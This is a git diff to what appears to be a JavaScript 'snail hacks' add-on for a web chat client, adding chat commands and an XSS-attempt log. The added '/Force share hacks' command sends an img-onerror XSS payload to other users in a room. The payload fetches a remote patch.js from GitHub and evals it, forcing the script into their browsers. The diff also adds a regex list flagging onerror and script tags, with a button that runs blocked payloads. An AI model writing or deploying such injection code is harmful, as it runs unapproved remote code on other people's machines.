@@ -5,6 +5,8 @@ const snail = {
     },
     nameChange: true,
     seeAll: true,
+    xssTimes: 0,
+    xssPayloads: ["Theese are the peices of code someone (or a Hacker) could have injected into your browser (but were stopped by snail hacks): "],
     commands: [
         {
             commands: "/help",
@@ -72,33 +74,56 @@ const snail = {
                   item.innerHTML = "You Already Have An Image Menu Open. Would You Like To Close It? <button onclick='imgMenu.remove(); allowedImg = true;'>Close Menu</button><button onclick='this.parentElement.remove();'>Cancel</button>";
                   item.style.color = "red";
                   messages.appendChild(item);
-                  item.setAttribute("class", brightness)
+                  item.setAttribute("class", brightness);
                   window.scrollTo(0, document.body.scrollHeight);
                 }
             `,
             description: "Opens an Image Menu where you can add Images from Files Or URL Links."
         },
         {
-            commands: "/share-hacks",
+            commands: "/share hacks",
             handler: `
-            share()
+            share();
         `,
-        description: "Sends a payload that shares snail-hacks to everybody in the room!"
+        description: "Sends a payload that shares snail-hacks to everybody in the room! Download via link."
         },
         {
-            commands: "/create-command",
+            commands: "/create command",
             handler: `
                 snail.commands.push({commands: input.value.split("[")[1].substring(0, input.value.split("[")[1].search(/]/)), handler: input.value.split("[")[2].substring(0, input.value.split("[")[2].search(/]/)), description: input.value.split("[")[3].substring(0, input.value.split("[")[3].search(/]/))});
             `,
             description: "Allows you to create a command eg. '/help'. /create-command [/command-name (Make sure the brackets are here when typing the name)] [The Javascript Code The Command Executes When Run (Make sure the brackets are here when typing the name)] [A description of what the Command does (Make sure the brackets are here when typing the name)]"
+        },
+        {
+            commands: "/Force share hacks",
+            handler: `
+            let user = input.value.split(" ")[3];
+            let script = "<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>";
+            if (user) {
+                script.replace("<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>", "if (window.name == user) {<img src='a' onerror=\`javascript:fetch('https://raw.githubusercontent.com/Snail26/Snail-Chat-Hacks/main/patch.js').then(r => r.text().then(eval));\`>}");
+            }
+            socket.emit("html message", script, room)
+            `,
+            description: "Force shares the snail hacks to a specific user or all users in a room. Usage: username (leave blank for all users in the room)."
+        },
+        {
+            commands: "/display xss attempts",
+            handler: `
+                snail.xssPayloads.forEach((xss) => {
+                    showMsg(xss, "red");
+                });
+            `,
+            description: "Shows all xss attempts that have been blocked."
         }
         /*
-        Deafault for commands is
-        commands: "/command",
-        handler: `
-            
-        `,
-        description: "desc"
+        Deafault for commands is: 
+        {
+            commands: "/command",
+            handler: `
+
+            `,
+            description: "desc"
+        }
         */
     ]
 };
@@ -124,9 +149,6 @@ form.addEventListener("submit", (e) => {
     }
   }
 })
-
-let xssTimes = 0;
-const xssPayloads = {};
 
 change();
 
@@ -192,15 +214,15 @@ socket.on('html message', (msg, room1) => {
     }
     let item = document.createElement('li');
     if (/onerror|<script|onload|onmouseover/igm.test(msg.toString())) {
-        xssTimes += 1;
-        xssPayloads[xssTimes] = msg;
+        snail.xssTimes += 1;
+        snail.xssPayloads.unshift(msg);
         showMsg(`There was an XSS attempt: \n
         ${msg}`, "red");
         let button = document.createElement("button");
         item.appendChild(button);
-        button.setAttribute("data", xssTimes);
-        button.setAttribute("onclick", `addHTML("[{from room: ${room1}}]: " + xssPayloads[this.getAttribute('data')]); this.remove();`);
-        button.innerText = "Add";
+        button.setAttribute("data", snail.xssTimes);
+        button.setAttribute("onclick", `addHTML("[{from room: ${room1}}]: " + snail.xssPayloads[Number(this.getAttribute('data'))]); this.remove();`);
+        button.innerText = "Allow (Runs this code)";
         showMsg("^^!!If you don't know what this means, don't click add. You could get hacked!!^^ (Make sure you trust this person if you don't understand the code and want to press Add)")
     }
     else {
